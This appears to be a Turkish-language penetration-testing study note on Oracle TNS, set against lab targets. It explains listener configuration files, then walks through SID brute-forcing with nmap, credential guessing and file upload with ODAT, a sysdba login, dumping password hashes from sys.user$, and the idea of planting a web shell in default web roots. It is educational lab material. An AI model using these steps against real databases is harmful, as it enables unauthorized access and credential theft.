# Oracle Transparent Network Substrate (TNS) 


Oracle veritabanları ile uygulamalar arasında ağ üzerinden iletişimi kolaylaştıran bir iletişim protokolüdür. İlk olarak Oracle Net Services yazılım paketinin bir parçası olarak sunulan `TNS`; `IPX/SPX` ve `TCP/IP` protokol yığınları gibi, Oracle veritabanları ile istemci uygulamalar arasındaki çeşitli ağ protokollerini destekler.

**Default Port:** `1521`

## Default Configuration

Ayrıca dinleyici, istemci ile sunucu arasındaki iletişimi şifrelemek için Oracle Net Services'ten yararlanır. Oracle TNS'ye ait yapılandırma dosyaları `tnsnames.ora` ve `listener.ora` olarak adlandırılır ve genellikle `$ORACLE_HOME/network/admin` dizininde bulunur. Düz metin biçimindeki bu dosyalar, Oracle veritabanı örnekleri (instances) ve TNS protokolünü kullanan diğer ağ hizmetleri için yapılandırma bilgilerini içerir.


### Tnsnames.ora


```txt

ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
)

```
+ [ ] **Burada, `10.129.11.102` IP adresinde `TCP/1521` portunu dinleyen `ORCL` adlı bir hizmet görüyoruz.**
+ [ ] **İstemciler, bu hizmete bağlanırken `orcl` hizmet adını kullanmalıdır.** 

### Listener.ora


```txt

        txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle

```

Oracle veritabanları, `PL/SQL Dışlama Listesi` (PlsqlExclusionList) adı verilen bir mekanizma kullanılarak korunabilir. Bu, kullanıcı tarafından oluşturulan ve `$ORACLE_HOME/sqldeveloper` dizinine yerleştirilmesi gereken bir metin dosyasıdır; dosya, yürütülmemesi (çalıştırılmaması) gereken PL/SQL paketlerinin veya türlerinin adlarını içerir. PL/SQL Dışlama Listesi dosyası oluşturulduktan sonra, veritabanı örneğine (instance) yüklenebilir. Söz konusu dosya, Oracle Application Server üzerinden erişilemeyen bir kara liste işlevi görür.

| Ayar | Açıklama |
|---|---|
| `DESCRIPTION` | Veritabanı ve bağlantı türü için bir tanımlayıcı ad sağlar. |
| `ADDRESS` | Veritabanının ağ adresidir. Ana bilgisayar adı ve port numarasını içerir. |
| `PROTOCOL` | Sunucuyla iletişimde kullanılan ağ protokolü. |
| `PORT` | Sunucuyla iletişimde kullanılan port numarası. |
| `CONNECT_DATA` | Bağlantının özniteliklerini belirtir, örneğin servis adı veya SID, protokol ve veritabanı örnek tanımlayıcısı. |
| `INSTANCE_NAME` | İstemcinin bağlanmak istediği veritabanı örneğinin adı. |
| `SERVICE_NAME` | İstemcinin bağlanmak istediği servisin adı. |
| `SERVER` | Veritabanı bağlantısında kullanılan sunucu türü, örneğin dedicated veya shared. |
| `USER` | Veritabanı sunucusuna kimlik doğrulaması için kullanılan kullanıcı adı. |
| `PASSWORD` | Veritabanı sunucusuna kimlik doğrulaması için kullanılan parola. |
| `SECURITY` | Bağlantının güvenlik türü. |
| `VALIDATE_CERT` | SSL/TLS ile sertifikanın doğrulanıp doğrulanmayacağını belirler. |
| `SSL_VERSION` | Bağlantıda kullanılacak SSL/TLS sürümü. |
| `CONNECT_TIMEOUT` | İstemcinin bağlantı kurmak için bekleyeceği süre (saniye). |
| `RECEIVE_TIMEOUT` | İstemcinin veritabanından yanıt alması için bekleyeceği süre (saniye). |
| `SEND_TIMEOUT` | İstemcinin veritabanına istek göndermek için bekleyeceği süre (saniye). |
| `SQLNET.EXPIRE_TIME` | İstemcinin bir bağlantının koptuğunu tespit etmesi için süre (saniye). |
| `TRACE_LEVEL` | Veritabanı bağlantısının izleme (tracing) düzeyi. |
| `TRACE_DIRECTORY` | İzleme dosyalarının saklandığı dizin. |
| `TRACE_FILE_NAME` | İzleme dosyasının adı. |
| `LOG_FILE` | Günlük bilgilerinin saklandığı dosya. |

**Güvenlik açısından dikkat edilecekler:**

- **`PASSWORD`** bağlantı dizesinde açık metin olarak yazılıysa, bu dosyaya erişen herkes veritabanı parolasını görebilir. Yapılandırma dosyalarında parola taramak bug bounty'de sık yapılan bir keşif adımıdır.
- **`VALIDATE_CERT`** kapalıysa istemci sahte bir sunucuya bağlanabilir, yani ortadaki adam (MITM) saldırısına açık olur.
- **`SSL_VERSION`** eski bir sürüme ayarlıysa, bilinen zafiyetli protokoller kullanılabilir.
- **`TRACE_LEVEL` ve `LOG_FILE`** açıksa, izleme dosyaları hassas sorgu ve kimlik bilgilerini içerebilir. Bu dosyalara erişim kontrol edilmelidir.


---



## enumerate oracle


### nmap

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open

1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

```
####  Nmap - SID Bruteforcing


```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

```

## ODAT `oracle database attack tool`

### odat file upload 

```bash
echo "Oracle File Upload Test" > testing.txt


./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt


# veriyi çekme

curl -X GET http://10.129.204.235/testing.txt

```



```bash
odat all -s 10.129.204.235



[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

<SNIP>

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

<SNIP>
```

**Bu örnekte, 'scott' kullanıcısı için geçerli kimlik bilgilerini (parolası 'tiger') tespit ettik. Ardından, Oracle veritabanına bağlanmak ve onunla etkileşimde bulunmak için `sqlplus` aracını kullanabiliriz.**


### sqlplus
**XE** yukarıdaki `nmap` taramasından aldık **oracle-sid-brute**

+ bağlanmadan önce su ayarı yapmamız lazım

```bash
 sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig

 ## bu ayarı geri kapatmak için 

 sudo rm /etc/ld.so.conf.d/oracle-instantclient.conf; sudo ldconfig
```

```bash
sqlplus scott/tiger@10.129.204.235/XE
```

#### sisteme girdik sonraki işlemler

**Oracle RDBMS - Interaction**

```bash
select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

<SNIP>


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

#### Oracle RDBMS - Database Enumeration

```bash
sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
<SNIP>
```

Ancak, yeni kullanıcılar eklememiz veya herhangi bir değişiklik yapmamız mümkün değildir.

Bu aşamada, `sys.user$` tablosundan parola özetlerini (hash) alabilir ve bunları çevrimdışı ortamda kırmayı deneyebiliriz. Bunun için kullanılacak sorgu şu şekilde görünecektir:

```bash
select name, password from sys.user$;



NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D

```

**Bir diğer seçenek ise hedefe bir "web shell" (web kabuğu) yüklemektir. Ancak bu, sunucuda bir web sunucusu yazılımının çalışıyor olmasını gerektirir; ayrıca web sunucusunun kök dizininin tam konumunu da bilmemiz gerekir. Yine de, üzerinde çalıştığımız sistemin türünü biliyorsak, varsayılan yolları deneyebiliriz; bunlar şunlardır:**

+ **Linux** `/var/www/html`
+ **Windows** `C:\inetpub\wwwroot`


11.2.0.2.0s